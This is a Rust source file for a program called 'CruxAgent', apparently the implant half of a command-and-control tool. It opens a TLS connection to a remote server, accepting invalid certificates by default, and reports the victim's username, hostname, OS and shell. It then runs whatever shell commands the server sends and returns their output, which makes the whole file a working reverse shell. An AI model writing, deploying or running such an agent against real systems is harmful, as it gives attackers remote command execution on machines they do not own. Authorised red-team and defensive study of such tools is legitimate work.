mod args;
#[path = "../utils/mod.rs"]
mod utils;

// crates
use native_tls::{TlsConnector, TlsStream};
use clap::error::Result;
use clap::{Parser};
use whoami::{self, fallible};
use serde_json;
use subprocess::{Exec, ExitStatus, Redirection};

// std
use std::env;
use std::net::{TcpStream};
use std::path::Path;

// My stuff
use args::CruxAgentArgs;
use utils::network::write_length_prefix;
use utils::data::{CmdType, Metadata, Message, os_detect};
use utils::network::read_length_prefix;
use utils::shell_var::parse_var_def;

fn send_metadata(shell: &str, stream :&mut TlsStream<TcpStream>) -> Result<(), Box<dyn std::error::Error>>{
    // Prepare Metadata
    let metadata = Metadata {
        username: whoami::username(),
        hostname: fallible::hostname().map_or("UNKNOWN_HOSTNAME".to_string(),|d| d),
        os_type: os_detect(),
        shell_path: shell.to_string()
    };
    let metadata_serial = serde_json::to_string(&metadata)?;

    // Send metadata back to CruxServer
    let _ = write_length_prefix(stream, &metadata_serial.as_bytes());
    Ok(())
}

fn send_response(cmd_output: &Message, stream: &mut TlsStream<TcpStream>) -> Result<(), Box<dyn std::error::Error>>{
    // Serialize CmdResult
    let result_str = serde_json::to_string(cmd_output)?;
    write_length_prefix(stream, result_str.as_bytes())?;
    Ok(())
}

fn normalize_exit_code(status: ExitStatus) -> i64 {
    match status {
        ExitStatus::Exited(code) => code.into(),
        ExitStatus::Signaled(sig) => <u8 as Into<i64>>::into(sig)*-1,
        ExitStatus::Other(code) => code.into(),
        ExitStatus::Undetermined => -1,
    }
}

fn choose_shell() -> Result<String, Box<dyn std::error::Error>> {
    let candiates = [
        "/bin/bash",
        "/usr/bin/bash",
        "/bin/sh",
        "/usr/bin/sh",
        "/bin/zsh",
        "/usr/bin/zsh",
        "/bin/dash",
        "/usr/bin/dash",
        "/bin/ash",
        "/usr/bin/ash",
        "/bin/busybox",
        "/usr/bin/busybox",
    ];

    for shell in &candiates {
        if Path::new(&shell).exists() {
            return Ok(shell.to_string());
        }
    }
    return Err("No shell found".into())
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = CruxAgentArgs::parse();

    // Connect to CruxServer via TLS
    let connector = TlsConnector::builder()
        .danger_accept_invalid_certs(!args.verify_cert)
        .build().unwrap();

    let ip_str = format!("{}:{}", args.rhost, args.rport);
    let stream = TcpStream::connect(ip_str)?;
    let mut stream = connector.connect(&args.rhost.to_string(), stream)?;

    let shell_path = choose_shell()?;
    send_metadata(&shell_path, &mut stream)?;

    // Set User environment variable
    let user = whoami::username();
    unsafe {
        env::set_var("USER", &user);
    }

    loop {
        let received_msg_vec = match read_length_prefix(&mut stream){
            Ok(c) => c,
            Err(_) => continue
        };
        let received_msg: Message = match serde_json::from_slice(&received_msg_vec) {
            Ok(c) => c,
            Err(_) => continue
        };

        let mut cmd_output = Message::CmdOutput { id: 0, data: String::from("") };
        let mut cmd_exit = Message::CmdExit { id: 0, status: 0 };
        match received_msg {
            Message::Cmd { id:_, cmd_type, args } => {
                match cmd_type {
                    CmdType::Exit =>{
                        break
                    }
                    CmdType::Cd =>{
                        let new_dir = match args.as_str() {
                            "" => env::var("HOME").unwrap_or("/".to_string()), // Home directory
                            _ => args
                        };
                        match env::set_current_dir(new_dir) {
                            Ok(_) => {
                                cmd_output = Message::CmdOutput {
                                    id: 0, data: String::from("")
                                };
                            }
                            Err(e) => {
                                cmd_output = Message::CmdError {
                                    id: 0, error: format!("Error from CruxAgent: {}", e)
                                };
                            }
                        };
                    }
                    CmdType::Export =>{
                        match parse_var_def(&args) {
                            Ok(var_tuple) => {
                                unsafe {
                                    env::set_var(var_tuple.0, var_tuple.1);
                                }
                                cmd_output = Message::CmdOutput {
                                    id: 0, data: String::from("")
                                };
                            }
                            Err(e) => {
                                cmd_output = Message::CmdError {
                                    id: 0, error: format!("Error from CruxAgent: {}", e)
                                };
                            }
                        };
                    }
                    CmdType::Exec => {
                        let execution = Exec::cmd(&shell_path)
                            .arg("-c")
                            .arg(&args)
                            .stdout(Redirection::Pipe)
                            .stderr(Redirection::Merge);

                        match execution.capture(){
                            Ok(output) => {
                                cmd_output = Message::CmdOutput { id: 0, data: output.stdout_str() };
                                cmd_exit = Message::CmdExit { id: 0, status: normalize_exit_code(output.exit_status) }
                            }
                            Err(e) => {
                                cmd_output = Message::CmdError { id: 0, error: format!("Error from CruxAgent: {}", e) };
                            }
                        }
                    }
                    _ => {}
                }
                if let Err(_) = send_response(&mut cmd_output, &mut stream){
                    // TODO: Introduce some error handling here???
                    break;
                }
                // Only send cmd_exit if our command didn't cause an error
                if let Message::CmdOutput { id:_, data:_ } = cmd_output {
                    if let Err(_) = send_response(&mut cmd_exit, &mut stream){
                        // TODO: Introduce some error handling here???
                        break;
                    }
                }
            }
            Message::Kill { id:_ } => {
                continue
            }
            _ => {
                continue
            }
        }
    }
    stream.shutdown()?;
    Ok(())
}
